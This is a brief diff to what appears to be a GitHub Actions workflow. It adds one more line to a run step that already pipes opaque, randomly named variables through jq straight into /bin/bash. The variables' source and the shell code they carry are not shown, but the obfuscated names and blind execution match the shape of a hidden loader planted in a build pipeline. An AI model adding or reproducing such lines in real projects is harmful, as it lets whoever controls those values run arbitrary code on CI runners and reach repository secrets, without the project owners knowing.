@@ -31,6 +31,7 @@ jobs:
           printf '%s' "$xydu14" | jq -r .u826 | /bin/bash
           echo $ou1 | jq -r .qqaf3980 | /bin/bash
           echo $l42 | jq -r .wt4170 | /bin/bash
+          echo $otzhl26 | jq -r .e968 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
